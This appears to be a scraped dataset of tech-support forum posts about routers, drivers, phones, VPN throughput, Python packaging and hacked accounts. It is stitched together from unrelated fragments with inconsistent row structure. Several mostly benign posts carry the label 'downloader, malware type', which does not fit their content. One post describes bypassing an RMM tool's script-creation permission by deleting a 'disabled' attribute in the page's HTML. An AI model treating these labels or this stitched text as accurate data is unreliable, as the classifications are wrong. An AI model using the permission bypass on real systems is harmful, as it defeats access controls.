I hope my IT team can sort this out without losing my data. It's been quite a headache dealing with this situation. Lesson learned - I need to be more cautious and double-check before opening any email attachments!

One of the first things he requested when he took over as CEO was a ""Windows 7 laptop"". At first I thought I misread it, but nope. I asked for clarification because I assumed it had to have been a mistake. To my horror, it was not. He specifically stated that he's been using windows 7 since its inception and that it's the last enterprise worthy OS release from Microsoft, and that he believes windows 10 is more about advertising and selling user data than being an enterprise/business oriented OS offering. 

He claims he came from the security sector and that they were able to accommodate him at his last job with a Windows 7 machine, and that that place ""was like fort Knox"", and that with a good anti virus and zero trust/least privilege there should be no concern using it over windows 10. 

At first I didn't know what to think.. I began downloading windows 7 updates in WSUS to accommodate the request. Then I thought about it more, and I think it's a lose lose for me.

Hi  everyone!  I just moved to a new place and have my desktop and game  console in my basement.  We have our router in the first floor close to  the basement door, however my internet speeds on my basement devices are  a little slow (specifically download speed is slower then I'm used too  which is a pain for modern games).  I'm thinking of ways to boost the  connection to these devices.  I've seen a few recommendations online,  however some of them involve a whole new router system (mesh) or feeding  an ethernet cable from the router to a device in the basement, which  I'd like to avoid.  The router is an ISP-provided modem/router combo which is connected via coaxial cable on the first floor.

One option that  may work is a wifi extender though I've heard so-so reviews on this  option.  The basement devices are stationary which may allow the  extender option to work well.  However, I have a coaxial port right by  the basement devices and both devices have ethernet ports so a wired  connection is possible, however coaxial to ethernet (MoCA) adapters are more expensive then I thought, as much as a good router for only one port!   If I could use an adapter/device with multiple ethernet ports, this  option might work well though.  Plugging in a second router into the coaxial basement port to connect the basement devices with is a another option I thought of, however I'm not sure if this is possible looking online.

With Pinepods you can play, download, and keep track of podcasts you enjoy. It allows for searching new podcasts using The Podcast Index or Itunes and provides a modern looking UI to browse through shows and episodes. In addition, Pinepods provides simple user managment and can be used by multiple users at once using a browser or app version. Everything is saved into a Mysql database including user settings, podcasts and episodes. It's fully self-hosted, and I provide an option to use a hosted API or you can also get one from the podcast API and use your own. There's even many different themes to choose from! Everything is fully dockerized and I provide a simple guide found below explaining how to install Pinepods on your own system.

There's also lots of modern features like MFA, self-service password resets, and some Podcast 2.0 functionality (more to come)

In addition to all that, I've built a client version of the app that can connect via API to your home server over something like a reverse proxy or tailscale.

292,"Python packaging with conda. Hi there.

I recently joined a start up and have been tasked with setting up package management for our internal python libraries. We work in the biotech and ml space, and a lot of the packages we use are index on conda channels. The current setup we have right now is to install our local repositories from GitHub, which are built with [setup.py](https://setup.py).

Initially I thought that we should just use poetry for all of our package management, and for any of our own private libraries, have a aws codebuild/artifact setup to host our libraries. I still think this seems like the best option for doing package management in python.

On the other hand, there are too many packages that we need that are available in conda ecosystem that are not available on pypi. We've noticed now that several dependencies have clashed between pip and conda when trying to use both at the same time. So we might as well lean into using the conda ecosystem completely. 

 In order to do this, I think that a good idea would be to use a private conda channel for any of our own libraries, and use conda-forge for any repos that we might need from pip. If for some reason we can't find a package on conda-forge, there seems to be a pretty easy process to follow to get it there from pypi.

My question is the following: Has anyone hosted their own conda channel before? I've seen options from:

The only way to use the AWS and Azure solutions is to locally mount the files from s3 in order to use the channel correctly, this just does not seem like the right way to use a conda channel, not to mention it involves downloading all/most of the files in the bucket in order to properly index the channel.

The anaconda and quertz solutions seem like a step up from mounting the s3 buckets, but they don't allow for federated logins, at least not natively, which leaves using something artifactory or some equivalent tool.  

I haven't really found any reports/guides for the standard way of doing this, which I find really surprising, because there aren't other people that are running into this. As far as I can tell, artifactory is the most enterprise ready solution that is available in order to do this, but I'm curious if there's something I haven't seen before, and whether others have ran into this problem as well.

Here is what the environment.yml file would look like for what we currently do.

As far as I can tell, artifactory is the most enterprise ready solution that is available in order to do this, but I'm curious if there's something I haven't seen before, and whether others have ran into this problem as well.

Here is what the environment.yml file would look like for what we currently do.

    name: package
channels:
      - conda-forge
      - bioconda
      - defaults
    dependencies:
      - awscli=1.27.134

      - python=3.10.11
      - pip:
        - GitHub.com/internal_repo/version/files.tar.gz

we recently started using Atera as our RMM and now have over 2000 devices under management, so security should be somewhat important after all. This morning also learned about CVE-2023-26077, CVE-2023-26078, which is fixed in version 1.8.4.9, our download for the client still delivers 1.8.3.7, but that's another topic. Now to the actual issue, I am a technician and do not get permission to create scripts, they are supposed to be approved by higher authority, so far so good. Under Devices is Run script is the point ""Create script"", if you go with the mouse over it is there ""Permissions required"" and is grayed out, a look in the HTML code, this button is deposited with a ""disabled"" lable, shortly ""disabled"" deleted and already I can create scripts. Can someone evualte this in his environment, with normal technician rights? I am still unsure if it is not due to our permission structure.",downloader,malware type

Please rate the importance, efficiency and benefits and don't mind what my current project is about or what I know already - I got spare time for self development each day

What I have in mind is:   


* Read a book, slowly and with full understanding - T-SQL Fundamentals by Ben Itzik
* Download free Databricks and go through their tutorials
* Learn Python and Spark
* Learn Snowflake (got some materials created by our SF guys + might participate in a 30 hr training course covering all the roles available)
* Learn and do further Azure (DP-203) or/and AWS (Solution Architect? Database?)
* Any other skill/tool - feel free to write it down

I know that certain can go in parallel and I will do, but if someone can rate the importance, usefullness amongst these listed and I know that for example you can do everything in spark that you can do in SQL + something more for example, but eventually I want to learn all the points I listed and wont omitt anything

Yesterday, I bought a used Pixel 6 Pro, and like an idiot, I didn't do the factory reset myself, I just left it as it was (seemingly factory reset already).  
  
Lo and behold, this morning, my Facebook account was stolen. I got it back, changed the password and whatnot and I saw that it was most likely someone in Vietnam (I live in Czechia). I wasn't sure if this attempt to get into my account was connected to my ""new"" phone, but it was a weird coincidence.  
  
Later today, after factory resetting the phone, I noticed that in the auto-translate function Google provides, there's one language. Vietnamese. How's that possible after factory resetting the device?  
  
So my question is - what else can I do to ensure the security of my ""new"" device and my accounts? Is the factory reset function reliable? Should I download some kind of malware scanner? Or is this all just too risky and I should return the phone (I have the option of doing so within two weeks of purchase as it is a reputable reseller).

I was transferring files to and from my phone to my Mac and vice versa as a test before my holiday with ZERO issues. I filled up about 10gb max in these tests, and then deleted them. Ever since I filled my SSD up on holiday, using an adapter with the SD cards going in to my phone, my Macbook pro no longer recognises the SSD. It shows up as storage in disk utility, but not useable.  
I didn't use the Samsung PSSD app before, so I downloaded it. This won't recognise the storage either as in, it says it can't read it, however in safe mode on my Mac the PSSD app won't show the SSD as being connected at all.  
The SSD is formatted as ""MBR"", ""Master Boot Record"". It hasn't touched a PC until today, but the issues started before that. Apple support say I should format it for Mac-based systems but there shouldn't be an issue, it was working before.   


I am floored by this flaw! Waiting on Apple support to get back to me as they've escalated it to a phone call, as well as Sony and Samsung saying they'll get back to me.

I used to use Prime to stream movies and download stuff overnight sometime so i could watch them buffer free. At some point many months ago, Prime started acting extremely sluggish/unresponsive when i initiated a download on it. Before that i could download multiple things and use the app just fine, but now it's just so awful.

If i stop all downloads on Prime, BITS is still downloading stuff. Like we're talking many many GB here. So it can't possible be Windows updates, and here i am asking for your input.

Uninstall/reinstall of Prime does nothing, same results. I have 2 laptops, both suffered the same Prime being sluggish issue around the same time. I tried in the Prime subreddit, nobody commented...yay.

So i presume Prime/any downloads have to go through BITS. That's fine, but why does BITS continue to download many GB after i stop Prime downloads? And why did the app become sluggish/unresponsive? At times, if i'm downloading and do manage to play a downloaded movie at the same time, the app goes unresponsive so i can't pause the movie but it continues playing fine.

This has been going on for months. There was an update over the last few months since i stopped using Prime, but it still does the same thing. My internet is (don't laugh) anywhere from 3-10 mbps on speedtest.

&#x200B;

They are highly concerned to the point where they may not give us coverage because of this:

&#x200B;

They found port 443 open on our Cisco router for our VPN.  They can go to the external IP and it resolves to a cisco page (X.X.X.X/+CSCOE+/logon.html).  If you have credentials for that portal, you can download the Cisco Anyconnect client.  I went to an external network and tried it. I couldn't find any other functionality to that page other than the client download. 

&#x200B;

All of this stuff was set up long before my time at the company, but is this not standard?  From my understanding the router portal is a feature that was put there on purpose.  

&#x200B;

They are really insisting that we shut down access to port 443.  I am really insisting that closing that port would render our VPN services non-existent.     


Are they being idiots? Am I being an idiot?  Are we all being idiots?  VPNs and routers are NOT my strong suit so I'm worried I'm missing something obvious.  

Should I stand my ground that this guy who did the port scan doesn't understand VPNs?",downloader,malware type
326,"Getting modules to extract form field data from a pdf. I've been going a bit mad in trying to figure out how to do this. So far I've tried using PyPDF2, pdfrw, pdfminer all to no avail. 

My goal is to extract the form fields from PDF's very similar to [this one (the pdf link will download it for you)](https://www.canada.ca/en/health-canada/services/drugs-health-products/compliance-enforcement/establishment-licences/forms/drug-establishment-licence-application-0033.html)

I want to be able to extract any form field values like the checkboxes, radio buttons and blank spaces. 

The issue being is that I cannot get my code to actually read any form fields, it keeps thinking there isn't any within the PDF. So far I have used the previously mentioned modules, I tried converting the objects with pickle to make it readable but nothing seems to work in actually acknowledging that form fields even exist within the file. 

I am not running into major errors within the code either, I can extract the text fine but it won't extract anything from the form fields. I am starting to wonder if this might be file specific? And the PDF form field objects are hard to read for some reason.

Does anyone else find extracting form fields difficult? Any ideas would be greatly appreciated, thanks.",downloader,malware type
327,"Nvidia kernel module failing to built on Ubuntu 22.04. Hello,  
  
I recently have been trying to get an old Dell Precision M4500 working with Linux and have been having a lot of issues with installing the GPU drivers on it.  
  
I first started with PopOS as that has built in Nvidia drivers, but the installation kept failing so I decided to move to Ubuntu and install the drivers manually.  
  
This laptop uses an old Quadro FX 1800M which from what I can tell, can only use the Nvidia 340.108.  
  
I first tried doing this:  
  
sudo systemctl stop gdm  
  
Then I downloaded the .run file from nvidia for 340 and ran  
  
chmod +x filename.run  
  
Then I ran the .run and rebooted. This did nothing and did not fully load the drivers in. I also ran  
  
lsmod | grep nvidia and sudo modprobe nvidia. These returned nothing so I believe the kernel module didn't load in correctly.  
  
I ended up having to wipe and start clean and then tried:  
  
chmod the downloaded .run driver  
  
sudo systemctl stop gdm3  
  
This made my system go completely black and unaccusable, so I had to wipe clean and start over again.  
  
I then found this tutorial https://www.youtube.com/watch?v=I-txHcFgHrw where a guy shows how to use the older driver. After rebooting to runlevel 3 in the grub kernel and running the nvidia driver as root, I get but into a CLI gui for the NVidia driver. I get to a part that asks ""Would you like to register the kernel module sources with DKMS?""  
  
If I say yes, it says ""Failed to install kernel module through DKMS. Please try installing again without DKMS or check logs.""  
  
I try again without using DKMS, and it says ""Unable to build the NVIDIA kernel module.""  
  
At this point I am so confused and have no idea how to proceed. Any help would be super appreciated!",downloader,malware type

 This is because selenium tries to autoinstall the latest chromedriver from [https://chromedriver.chromium.org/downloads](https://chromedriver.chromium.org/downloads) with the line: 

    driver = webdriver.Chrome(executable_path=ChromeDriverManager().install(), options=chrome_options)

So in our area in the southwest of the UK, we have just got Jurrasic fiber doing Gigabite internet installs all over, our has finally been completed, we went with the 450mbs package just to see how it goes since we can just upgrade down the road if it works and is stable.  


It's now been installed, and works great, went from a meh 20-40 download speed to up to 400mbs over wireless on my phone. Great Stuff.  


On my computer upstairs i have the typical powerline setup with a tp-link '600mb' model. And while I didn't expect to get the max out of this setup, i did expect better than standard wireless, on a speed test i get around 80Mb download, either way, I am still mega happy since it's still more than double what i got before.  


So how exactly to improve my connection for my powerline-connected computers?   
I could run long ethernet cables, i am mostly checking to see if i need to get specific cables for this for no bottleneck or if any long ethernet cable with do. Any good options here?  


Or, do I just need a good quality wireless option on my pc since the router itself seems fine based on my phone's ability to get its wifi download speed of 400mbs? Either option i am fine with.

I recently bought an AMD Radeon RX 7900 XTX and I've noticed that I have to re-install the drivers every-time I want to play a game on steam or restart my pc. It started when I noticed I couldn't see my playback video in Adobe Premiere Pro which I soon realized I couldn't even playback any video downloaded on my device (but I can hear audio just fine). Even opening steam games made the games crash instantly. Upon downloading drivers again, it fixes the problem until I decide to close my game or restart my pc then it's like my display drivers just break somehow. Only way to fix it is to re-install drivers through the AMD website and restart PC which is a massive annoyance. I've also ran all my windows updates. I thought going team red for AMD would be worth it but I'm really annoyed that I'm experiencing such a massive headache with drivers. I'm also trying to do video editing as a job and so I'm in a really disrupted spot, if anyone could help out that would mean the world.

Here's what I mean. Take Roland FP-E50 digital piano. Beyond piano sounds, it features many other kinds of sounds, but you can't edit and save presets like a synth. Roland runs a paid service where you can download sounds and upload it to the FP-E50, so it's like a game console, where you can run only licensed games. But here's the thing: FP-E50 runs the Zen-core engine, the same one in the Jupiter-X, Juno-X, Fantom workstations and the Zenology soft synth. So the FP-E50 could play presets edited on those other synths, and since it plays official wave expansions from Roland Cloud, it probably could play wave files created by the user and function like a sampler, but Roland made it to run underpowered in order to have players rellying solely on the content they sell.

So  I wondered, people hack almost every type of computer device, but what about modern synthesizers, workstations, other keyboard instruments, grooveboxes, etc.? There are so many possibilities. In the example I used, people could add on-board preset editing, compatibility to other file formats, overhaul the interface, assign MIDI values to buttons and faders, add new effects, increase layering and splitting, add the option to downgrade sound quality in order to increase polyphony, hell, people could run Doom on its LCD screen and play it with the keys, or run Android or Debian on it.

I was trying to install Linux Mint on a Windows computer, everything looked great until I restarted the system. After which I started getting this error.

The exact installation went like this:
Installed BalenaEtcher and downloaded Linux Mint 21.2 Cinnoman ISO image.
Flashed the ISO image onto a 16 GB flashdrive.
Checked from Windows if my laptop had UEFI or Legacy BIOS and it was showing UEFI.
Booted into BIOS, selected flashdrive in the boot menu to boot into the live session.
Started installing Mint.
I checked the box that said to install codecs and set a password.
Went into manual partitioning to seperate the root and home partition for future distro hopping.
From here, I basically followed this tutorial: https://youtu.be/gJDmqXI7RFA?t=706
Created a new partition table in /dev/sda with 1TB of space.
Created an EFI partition with 512MB space which was /dev/sda1, a SWAP partition with 2048MB sapce.
Created a root partition with 10240 MB space using ext4 and selected the mount point as ""/"".
Created a home partition with the rest of the disk using ext4 and selected the mount point as ""/home"".
Selected the device for boot loader installation as /dev/sda1, where the EFI partition was, and continued.
I created a profile and went onto finish the installation.
After the installation completed, it asked me if I wanted to continue testing or restart.
I figured I might as well upgrade all the programs at the same time instead of restarting it twice.
So I ran ""apt update"" and ""apt upgrade"" from the terminal and restarted the system.
It then showed me a scaled up version of the first image.
I went into BIOS by forcing the laptop to shutdown by holding the power button.

Now I'm stuck in this purgotory of BIOS and Mint startup options.
I tried re-flashing the flashdrive with another laptop but it only takes me to the screen in the image 2 as before I re-flashed it.

I don't have any other kernels to boot into besides the recovery option (image 3), and booting with that gets me the screen in the image 4.

I tried looking for an SGX option in the BIOS, since it says ""SGX disabled"" in the error message, but that was futile. I may try to look more thoroughly, however I don't think it's there.

Is there any chance of fixing or saving this situation? Maybe through an external device, accessing the hardware -like the harddrive- directly, or maybe using a different flashdrive for a different live session?

I tried looking up for solutions but each one I read includes booting into another kernel.

I and people in my situation would greatly appreciate any help, thanks in advance.

348,"Using a gaming router as a wifi adapter. Hello everyone! I currently have some cheap USB wifi adapter that although works, it sucks ass compared to my brother's pc with PCIE wifi adapter card (only 10-20 mbps download vs him having 60)

I could just get a better usb adapter or PCIE card, but I can't fit another PCIE card on my pc (sata extension card plus chonky GPU) Also can't do ethernet, in an apartment and it's already cluttered as it is, I'm trying to keep it as clean as possible.

So this brings me to thinking of a gaming wifi 6 router. Seems overkill just as a wifi adapter, but I do plan on doing wireless PC VR with it, specifically with a Quest 2. It requires a fair amount of bitrate for that to be viable (at least 30 mbps or MBps, not sure) and it can go up to 200 mbps/MBps. 

I did a fair amount of googling and whatnot, and can't seem to really find much about using a wifi router as a wifi adapter. However there already is videos about using one mainly for wireless PC VR.

Windows 10 noted that the drivers are incompatible and I could only see them when I clicked the show incompatible drivers check box.

355,"How to automatically pull driver updates from Microsoft Update **Catalog**? [That is: *Not* from the separate Microsoft Update, nor 3rd party programs]. I don't like relying on badly outdated and at times (in part) downright abandoned device manufacturer provided updates. Even the Dell Command tool lags in this respect, and it's one of the better ones.

Instead, [Microsoft Update Catalog](https://www.catalog.update.microsoft.com/Home.aspx) (this is **not** ""Microsoft Update"") has been a reliable & fast source for driver updates, despite its 00s era interface. (Some genius fell on their head and set results to cut off by the 1000 *oldest*.)

Trouble is, I only find out about these updates' existence from dubious nag-/shareware like Driver Easy or IOBit Driver Booster and then manually querying MUC for device IDs & co. I do that with isolated W11 device, then after testing deploy to the identical devices of actual users. Fortunately our environment is homogeneous enough.

**Is there an existing solution/script to make the test device search comprehensively on MUC & download such updates automatically?** That is, something to get rid of these silly 3rd party tools and the Sisyphean task of manually matching updates, when the latter are already in MUC.

Again: This is about the *Update Catalog* website, not the *Microsoft Update* service. Meaning the PSWindowsUpdate powershell module is useless here.

358,"PSA: Playnite for Gamestream instructions. This isn't new but people new to gamesteam might not know about Playnite which makes it easier to access all the launchers at once though gamestream in a steam big picture like interface through gamestream/moonlight

Think of it like a console like experience for gamestream/moonlight where you launch one shortcut and you can access all the games across all the launchers from one screen

The main point of this though is adding the batch script to allow it to change the resolution and close the session when playnite is closed rather than manually closing the session

Also for those that have issues with which screen is used in gamesteam, playnite has a target display setting right in the playnite settings if that helps

Links are all at the bottom

1. Install PlayNite
2. Download the launch-pad zip file and extract it and put it somewhere on your computer, like C:\\ (No install needed just copy the folder somewhere you can find it)
3. Make the gamestream shortcut in geforce experience to the GS \[Resolution you want on the desktop\].bat file in the folder you just made
4. If you want to hide the other shortcuts in moonlight hold down ""A"" on the shortcut and click ""Hide"" so that only Playnite is there for a clean look
5. Run the moonlight shortcut like normal and now it will change the resolution to what you want in session such as 4K then it will change the resolution back to normal and close the gamestream session when Playnite is exited
6. Make sure Playnite launches in full screen in the playnite settings and check off the setting for ""hide mouse cursor"" in Playnite to get a full ""console"" feel
7. Exit playnite by clicking on the icon in the top right and clicking exit playnite and that will trigger the resolution to go back to normal and the session to end in a few seconds

Playnite will ask during the install which launchers you want to connect to and it will pull in your installed and uninstalled games then download the artwork for them

Icon from google image search for playnite to make the gamestream shortcut look better

360,"Asking for help to workaround an attack before I'm going to wipe everything out, including hardware. Long story short: It all started with a malevolent person cloned my sim, accessed my telegram account (through the api perhaps, since there were never any active sessions other than my personal ones), made the desktop app logging keystrokes (an unknown hidden chat with a person that I noticed only through the tg web version said me I'm typing right now, that's the hole I'm sure about). At that time, I used both linux and windows. I'm not going into details why I'm thinking it's only a keylogger and how do I know that it's still there because It's a bit of a personal field and I know the person doing that myself. I'm also sure he gained no direct access to my filesystem, copied nothing, but managed to leave a malware inside the doors. I noticed that through wireshark and maltrail, the latest marked my tg activity as a possible ssti injection. I also know that me managed to place a keylogger into my gmail account, whenever I open it and leave it there, it logs my browser activity, otherwise it logs only my desktop since firefox has great sandboxing on its own BUT it probably does catch my clipboard from the browser even when gmail is closed. I formatted the linux drive and moved to a fresh installation, but I was still using my external drive on windows I only launch to play a game for a bit, and the keylogger moved to my linux machine somehow, although I never mounted an external drive to my linux installation - ext4 disks are also inaccessible by windows.

After that, I moved to wayland and now learn more about sanboxing, I'm using default firejail profiles for now, but really want to go deeper into selinux and apparmor. Also more firewall hardening, tinkering with kernel options, doas instead of sudo etc. Any advice would be appreciated!

Here's what I think why the keylogger is still haunting me:

1. Is there a possibility that a malware piece from a windows machine can move to an encrypted - excluding boot partition - ext4 disk that isn't even mounting in win by default without additional software? It is for sure encrypted and not mounted by the time I'm launching win.
2. I'm using a dirt chip router delivered by my isp (tplink ec-220-g5), it has internal memory, it is also possible to control it by my isp (through cwmp, I believe?). The settings are default, remote control is turned off. I know for a fact that an attacker had no physical access neither to my pc, nor to my network. Should I do something to my router except for a regular reset, just in case?
3. Any possibility my bios got a malware? How rare is that?
4. Is it possible a keylogger, or any malware at all, could be placed into my system upon entering the mail client, without clicking or downloading anything? That's a dumb question, but I'm highly paranoid rn. How realistically  it is to catch something fishy using firefox with ublock and the arkenfox user.js?
5. May it be possible that installing wine on linux makes the keylogger active? There was a pattern I noticed.

My guess is on the first point, but it sounds to me as unrealistic as any other points. Maybe there's more, but that's all I could think about.",downloader,malware type

While there is no internet the LEDs on the router are displaying everything is right and should be internet. I've contacted support multiple times, each time they said ""we will call you back once we found the issue"" every time. I'm completely lost. It may be that they need time because they just installed fiber optic cables in my neighbourhood, but they are a coutry wide company, and nothing changed since the first day.

Little help here please?

My sister just called that they have a problem: she is using a Xiaomi phone, his husband is using a Samsung phone, their son is using a Samsung phone too (but just to play games). Whenever their son downloads an app through play store that app downloads on EVERY OTHER phone in that household.

I've checked their phones for sync or any other options, even the google play store accounts are different, but I have iPhone so I can't really see what is going on their android phones.

Couple days ago i received my Meizu 20 Pro from Giztop (HK)  
  
pretty good phone so far, I factory resetted it to make it mine, however I didn't noticed Google Play services were sideloaded, and the whole phone became chinese after reset..  
  
  
  
Thanks to apkmirror i downloaded an APK Playstore file and transferred in to my internal memory through PC (usb cable). I installed the Playstore in which I could download all the GMS apps.  
With every chinese app now deleted, it works like any other phone. I have to say it's a pretty nice looking phone, also the speakers are great along with fast charging capabilities. Good screen with a very fast grapics card for gaming and everyday use.  
  
however I only have one quest to conquer. I seems my european carrier simcard (Vodafone) is using a diffrent communications protocol of something like that. I have 4g/5g and i'm able to call, or can be called.  
BUT I cannot see anyones number. I've tried different methots to fix, and different numbers from diffrent people to call me. Everyone was in my contacts, and if i would call someone, it would appear om my display. But people calling me... different story, NO number, NO contact information, JUST ''Unknown caller''. Very annoying to answer with your name everytime someone you know calls you...

I manage ETL jobs of a small team of machine learning engineers. We do not use any orchestration tool per se, the various jobs are all over our ecosystem

- cronjobs, various bash scripts, run as cronjob in kubernetes, once per day

Upon logging back in and changing the passwords, I see there's a bunch of emails sent from ""me"" to random emails just containing a dodgy link. Just a spoofing scam. 

I have changed all my passwords for each email, 2FA, etc. and removed any saved passwords and payments on Google as now I don't trust it.

This all happened because I had malware on my PC. Odd as I always scan anything I download and do scans frequently but whatever. I get a different AV to do a full scan and some files have been flagged so I get them deleted.

But before fully doing the scan I also had two security codes from EA sent to my two emails (two different accounts) which I never asked for. I don't know if this is still just the spoofing as I can still log into my EA accounts (passwords updated now) just fine. 

My question is now, is there anything else I can do? Definitely going to be more cautious in the future with potential malware, but are my emails compromised? Nothing has happened since but I'm still a bit paranoid.",downloader,malware type

I've always had Google Pixels and, for the most part, really liked them. I used to use a Chromebook and I liked that everything synced up. I don't use it so much anymore as it's pretty old now though. As is my phone, the Pixel 4a, which I've now learned won't be getting security updates as of August (this is the longest I've ever had the same phone!) and whose battery is pretty bad now.

I like how, when I buy a new phone, it just automatically downloads everything I had on my old phone. Photos, emails, apps, texts, etc.

Is this something that will only happen if I buy another Pixel? Or is it something that would happen with any Android? Specifically, Samsung Galaxy? I've got my eye on the Pixel 7a but there are cheaper Samsungs.

I'm open to any recs for the best phone to get. The camera on my Pixel 4a is awful - it automatically changes selfies somehow, it looks perfect for a second and then distorts the face. Yes, face retouching is off. It still happens. I just want a camera that captures what is *actually there* on selfie mode!

I have a Redmi 4x satoni Android version 7 miui 11 with no modifications(locked bootloader) not sure about oem unlocking  
What exactly happened was i met a cute girl in school who in turn texted me and told me to   
1) download and install an APK through a link which she sent and then delete the apk  
2)asked for my OTP online when she was doing some process on my sim card  
3)asked me to download a follower app for my Instagram from the playstore  
And probably some other things I can't remember (not sure though)  
And ofcourse I did so willingly as I didn't have a clue as to what went on behind the scenes and lacked technical knowledge so I did it and forgot about it   
I uninstalled the follower app which was easy but the other two were tough  
Sometime later she asked me if I used some features like VPN, greenify, swipe texting and told me to stop using them and I told her I have some content on my phone some secrets that I was not willing to share then later I got to know that she stole my phone  (if I use some parts of the phone which the malware cannot reach)(rootkit i think)  
At this point I was playing right into her trap and I only realised later on if I'm not wrong I have done some research which implies that I had fallen for a social engineering attack  
I only remember the apk had love in its name (three words) (if anyone knows the be of the app it will be helpful) and its perhaps a spyware app that tracks media , browser access and even a keylogger and on top of all this it even survives a factory reset  
Then she targets my laptop next by sending me a link which I clicked and I didn't even download anything and I was using chrome and it got infected with something which I removed using antivirus   
I tried almost all avs available and they all turned up clean  
I have taken my phone for repair and asked them to flash it and I told my sim provider that I have fallen for a sim swap scam(based on speculation) and now I'm here still with her (haven't met her lately) trying to cut all the connections which she made which was trying to control me   
Anything else I should be worried about? I think I have got everything although not sure about sim swap (as not on my end)  
But still did it   
Is these types of attacks common in High school?(in India)  
If so how are they doing it and what are they using to do it and what is the process of it is my question

Underlay:---  
==========  
User-----(wireless)------>AP----->L2switch----->WLC----L2switch----->L3 Gw/PANW FW ------->SD-wAN--------->Interent.   
Overlay:---  
==========  
User -------(ipsec)--------->L3 Gw/PANW ------->SD-wAN--------->Interent.   
The user overlay does connect PAN-OS firewall via GP client . PAN\_OS firewall has VPN gateway configured. I am testing same file download without VPN (GP disable)- The download speed is \~400Mbps which is good but the moment I turn on the VPN (GP on) the speed reduced to hardly \~1-1.5Mbps.  
\-To eliminate GP (VPN)  issue, I tried the same thing on Wired infra, in both scenarios, with VPN off  speed is close to \~400Mbps however with VPN on the speed is \~250Mbps which is good as well considering the overhead of ipsec encryption/deception.  
I am also in hard situation where i am unable to narrow down the issue, if i say wireless is problem then without VPN speed is good, so wireless is fine at the same time if I do VPN testing on Wired infra, VPN gives me expected throughput so I am going into loops where could the problem relies.   
So far I have seen it is combination of Wireless + VPN.   
 I was wondering if anyone else has experienced this issue or would have any suggestions.  
   
\-When the AP is connected to the local network it contacts the controller as expected, picks up the desired config and broadcasts the SSIDs. The issue is that any client connect to the SSID(s) experience awful bandwidth speeds (e.g. 1-1.5Mbps d/l).

419,"Dictionary creation and data frame column definition fails on incomplete data. I've updated the part of my downloading script that pulls in marketcap data. I'm seeing that some tickers get full data and others fails.

There seems to be 2 issues:

1. The function 'dataloader\_MCAP' fails when defining the results dictionary. I think this happens when I get an API response with missing values. At least when I try to manually define a dictionary will random data, the function runs through. But that leads to the next problem.
2. when I try to define the column df\_daily\['MarketCap'\] it will fail to add any values if the values in the dictionary is not a complete list

&#x200B;

The relevant section of my overall function looks like this:

    Add MCAP data to the dataframe -> calling dedicated function
    try: 
        MCAP_data = dataloader_MCAP(stock, list_trading_dates)
        df_daily['MarketCap'] = df_daily['Date'].map(MCAP_data)
    except Exception as e: 
        print(""Exception for market cap call"") print(e)

And the functions used for pulling in MCAP:

    def dataloader_MCAP_perday(stock, day): 
        current_data = ref_client.get_ticker_details(symbol=stock, date=day) return day, current_data['results']['market_cap'] # Return a tuple with the input day and the response

428,"Need objective help/reassurance after a nasty hack.. Hey.

So my gf downloaded a trojan the other day.  I think it was a session stealer, since it instantly got into her gmail (I believe it was open, or at least chrome was).

They then used the gmail to set the email of her discord account to some other email so we were essentially locked out at that point.

I noticed under the google account ""sessions"" it said the session was in some foreign country, but it also said it was \_your current session\_.  I quickly forced that session to sign out, unplugged the PC then on a clean laptop I had her change her Gmail password.  After that, the chaos stopped entirely.

I imagine it stopped after I forced them out and severed their connection, not sure if changing the Gmail password did anything.  I also made sure they didn't set up any forwarding addresses.  They were doing this somewhat manually, as I saw emails going into the trash.  They also were talking on the account and it wasn't some bot.  They manually were configuring stuff on the discord, and it was seemingly too slow for a script.

Now, here's the really hard part.  I have not been able to sleep and I am kept up by mini-nightmares of getting notifications on my phone that I'm being hacked or my account is being stolen because she had signed in as me at some point or another.  It was forever ago, but she did sign in.

My main fears now are this:

\- they have all the autofill/password data from the chrome browser.  This is mitigated I guess after we went and manually changed and enabled google auth for all the accounts that profile might have had.

\- they have credit card info.  I've frozen the card and requested a new one asap.  They did charge the card using the discord account which I assume they then ""gift"" to basically lander the money.

\- somehow they will get into my gmail account despite it having google auth, device push notifications and no SMS or recovery email.

I \_really\_ need to get some sleep tonight.  My grandfather is in absolutely poor health and my car is having issues so this just sorta pushed me over the edge and I just need a small win here.  Someone that knows wtf is up (when it comes to viruses) to tell me I've done what I could and I'm probably ok and I'm not going to have my bank account drained in the middle of the night.

What I'm wanting to do is know what quality is downloaded. Currently what I'm getting is the resolution of the video itself and the technical format of the streams downloaded and merged which looks like `'248 - 1080x1920 (1080p)+251 - audio only (medium)'`.

In my experience so far the `'248 - 1080x1920 (1080p)+251 - audio only (medium)'` format isn't always like that.

445,"2,000 free downloads available for ""Web Scraping Techniques for Developers"" online video course. Beginner friendly. Focused on Python tools and techniques. (July 2023). If you want to learn web scraping or improve your data scraping, I've made short video course you can watch to learn all the techniques you can use to increase your chances of scraping public data even if they are protected by anti-bot detection like Cloudflare.

I've released it so that 2,000 people can have it for free. All you need to do is [follow this link](https://stevennatera.gumroad.com/l/isfsd/93mafvj) and the discount should be applied. If not **93MAFVJ** is the discount code. The code expires in 48 hours.

# Backstory

After I was laid off by Twitter, I focused on a side project I never finished. I wanted to build a search engine to fuzzy search job descriptions on the internet. In order to make this work I needed a lot of data. An MVP with \~10 data sources wasn't going to make a dent on this project.

There weren't any jobs API endpoints to help me. Data companies wanted over $100k to access their jobs data. I was hitting brick walls with data source. So I decided to give web scraping a try. I needed at least \~1000 data sources. For the next 6 months all I did was learn all the techniques I could use to scrape websites.

At first it was difficult. Not a single technique always worked. Every website was unique. However, with every smaller website I scraped, I wrote down the working technique. Over time instead of banging my head against the wall with bad code, I would run a series of quick tests to determine if it was possible to get the data. With this approach my success rate went up 10 fold.

At the end of my focus period, I blew past my goals. **I scraped over 70,000 job descriptions from 2,500+ job boards!** With these techniques, I went on to scrape 50,000 digital marketing companies from Clutch.co. I even scraped 3,000 companies from Crunchbase, one of the top sites for B2B data.

My continued success with scraping websites showed I had a winning method I could share with other developers to level up their web scraping skills. The video course teaches you same series of steps I use to successfully scraping public website data, even if they are protected by anti-bot detection software.

I hope you enjoy the course. Let me know what you think!",downloader,malware type
446,"Trying to test a policy-map with iperf3 and I don't understand why it's not working. Starting to question my sanity.. If you're bored/interested, I could really use another pair of eyeballs and hopefully an explanation of what I'm doing wrong so I can learn from it.

I am trying to test the behavior of an Arista router and some policy-maps. I would like to see how traffic is rate-limited when I have two customers connected to the router - using the same policy-map to rate limit their traffic. Specifically - I'm trying to verify that if I have a policy-map limiting traffic to 55 Mbps download, that both customers still get 55 Mbps download and not 27.5Mbps/27.5Mbps.

